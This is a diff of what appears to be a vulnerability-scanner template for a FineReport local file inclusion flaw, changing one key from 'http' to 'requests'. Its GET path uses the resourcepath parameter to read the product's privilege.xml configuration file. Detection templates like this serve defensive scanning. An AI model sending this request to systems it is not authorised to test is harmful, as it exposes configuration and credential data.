@@ -7,7 +7,7 @@ info:
   reference: http://foreversong.cn/archives/1378
   tags: finereport,lfi
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/WebReport/ReportServer?op=chart&cmd=get_geo_json&resourcepath=privilege.xml"
